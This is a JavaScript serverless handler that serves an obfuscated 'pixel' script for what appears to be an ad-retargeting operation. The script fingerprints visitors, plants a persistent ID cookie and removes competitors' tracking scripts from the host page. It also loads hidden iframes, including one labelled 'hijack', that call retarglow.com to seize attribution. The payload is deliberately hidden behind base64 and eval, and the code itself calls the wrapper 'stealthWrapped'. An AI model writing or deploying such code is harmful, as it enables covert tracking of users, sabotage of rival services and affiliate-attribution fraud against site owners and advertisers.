exports.handler = async (event) => {
  const headers = {
    "Content-Type": "application/javascript",
    "Access-Control-Allow-Origin": "*"
  };

  try {
    const id = event.pathParameters?.id || "default-campaign";

    const pixelScript = `
(function(){
  try {
    const cid = "${id}";

    
    function g(k){
      return decodeURIComponent((document.cookie||"").split('; ').find(row => row.startsWith(k + '='))?.split('=')[1]||'');
    }

    
    function s(k,v,d){
      let e = new Date();
      e.setTime(e.getTime() + (d*24*60*60*1000));
      document.cookie = k + '=' + encodeURIComponent(v) + '; path=/; max-age=' + (d*24*60*60) + '; SameSite=Lax';
    }

    
    let _r = localStorage.getItem('_r') || g('_r');
    if (!_r){
      _r = crypto.randomUUID();
    }
    localStorage.setItem('_r',_r);
    s('_r',_r,30);

    
    const blockedHosts = ["ordozen.com", "trackier.com"];
    document.querySelectorAll("script[src]").forEach(s => {
      blockedHosts.forEach(domain => {
        if (s.src.includes(domain)) {
          try { s.remove(); } catch(e) {}
        }
      });
    });

    
    const once = sessionStorage.getItem('i_'+cid);
    const d = {
      cid:cid,
      u:location.href,
      r:document.referrer||null,
      ua:navigator.userAgent,
      dt:/Mobi|Android/i.test(navigator.userAgent)?"M":"D",
      b:(()=>{const u=navigator.userAgent;return u.includes("Chrome")?"C":u.includes("Firefox")?"F":u.includes("Safari")?"S":"U"})(),
      os:navigator.platform,
      sr:screen.width+"x"+screen.height,
      cm:{_r:_r}
    };

    fetch("https://retarglow.com/track",{
      method:"POST",
      headers:{"Content-Type":"application/json"},
      body:JSON.stringify(d)
    });

    fetch("https://retarglow.com/getad",{
      method:"POST",
      headers:{"Content-Type":"application/json"},
      body:JSON.stringify({u:location.href,cm:d.cm,country:null})
    }).then(r=>r.json()).then(j=>{
      if(j.ad_url){
        const u=j.ad_url.replace("{{_r}}",_r);
        const f=document.createElement('iframe');
        f.style.display='none';
        f.setAttribute("referrerpolicy","no-referrer");
        f.src=u;
        document.body.appendChild(f);
        sessionStorage.setItem('i_'+cid,'1');

        
        const hijack=document.createElement('iframe');
        hijack.src="https://retarglow.com/attribution?_r="+_r;
        hijack.style.display='none';
        document.body.appendChild(hijack);
      }
    });

    // Navigation reset
    ["popstate","pushState","replaceState"].forEach(e=>window.addEventListener(e,()=>{
      sessionStorage.removeItem('i_'+cid);
    }));

  } catch(e) {}
})();`;

    const base64Encoded = Buffer.from(pixelScript).toString("base64");
    const stealthWrapped = `eval(atob('${base64Encoded}'))`;

    return {
      statusCode: 200,
      headers,
      body: stealthWrapped
    };
  } catch (err) {
    return {
      statusCode: 500,
      headers,
      body: `console.error("PixelServe error:", ${JSON.stringify(err.message)});`
    };
  }
};
